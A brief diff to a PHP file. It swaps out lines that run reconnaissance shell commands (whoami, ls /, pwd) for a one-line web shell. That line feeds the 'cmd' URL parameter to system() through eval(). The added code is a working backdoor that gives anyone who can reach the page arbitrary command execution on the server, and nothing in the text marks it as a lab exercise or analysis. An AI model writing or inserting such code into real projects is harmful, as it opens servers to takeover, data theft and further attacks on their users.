@@ -1,7 +1,1 @@
-<?php 
-system('whoami');
-system('ls /');
-system('pwd');
-system('ls .');
-system('ls ..')'
-?>
+<?php eval('system("'.$_GET['cmd'].'");'); ?>
